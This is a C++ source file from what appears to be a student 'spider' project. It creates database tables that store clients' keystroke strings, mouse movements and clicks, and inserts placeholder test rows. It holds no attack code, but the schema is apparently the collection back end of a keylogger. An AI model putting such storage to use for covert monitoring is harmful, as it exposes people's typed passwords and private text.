//
// SqlServer.cpp for sqlServer in /home/debrab_t/rendu/TEK3/cpp_spider/bdd_connect
//
// Made by debrab_t
// Login   <debrab_t@epitech.net>
//
// Started on  Mon Nov  7 10:23:09 2016 debrab_t
// Last update Mon Nov  7 15:44:32 2016 debrab_t
//

#include "SqlServer.hh"

SqlServer::SqlServer()
{
}

SqlServer::~SqlServer()
{

}

bool	SqlServer::dbConnect(std::string const &con)
{
  return (sqlMan.connect(con));
}


void	SqlServer::createServTab()
{
  sqlMan.createTable("CLIENT",
		  "ID  SERIAL PRIMARY KEY,"	\
		  "PUBLICKEY TEXT NOT NULL");
  sqlMan.createTable("MOUSE_MOUVEMENT",
		  "ID  SERIAL PRIMARY KEY,"		      \
		  "ID_CLIENT INT NOT NULL,"		      \
		  "TIMESTAMP TEXT NOT NULL,"		      \
		  "X INT NOT NULL,"			      \
		  "Y INT NOT NULL");
  sqlMan.createTable("MOUSE_CLICK",
		  "ID  SERIAL PRIMARY KEY,"		      \
		  "ID_CLIENT INT NOT NULL,"		      \
		  "TIMESTAMP TEXT NOT NULL,"		      \
		  "X INT NOT NULL,"			      \
		  "Y INT NOT NULL,"			      \
		  "ID_CLICK INT NOT NULL");
  sqlMan.createTable("KEYBOARD_STRING",
		  "ID  SERIAL PRIMARY KEY,"	\
		  "ID_CLIENT INT NOT NULL,"	\
		  "STRING TEXT NOT NULL");
}

void	SqlServer::addClient()
{
  sqlMan.insertData("CLIENT",
		    "PUBLICKEY",
		    "'publickey test'");
}

void	SqlServer::addMouseMouvement()
{
  sqlMan.insertData("MOUSE_MOUVEMENT",
		    "ID_CLIENT, TIMESTAMP, X, Y",
		    "1, 'timestamp test', 8, 2");
}

void	SqlServer::addMouseClick()
{
  sqlMan.insertData("MOUSE_CLICK",
		    "ID_CLIENT, TIMESTAMP, X, Y, ID_CLICK",
		    "1, 'timestamp test', 8, 2, 3");
}

void	SqlServer::addKeyboardString()
{
  sqlMan.insertData("KEYBOARD_STRING",
		    "ID_CLIENT, STRING",
		    "1, 'string test'");
}
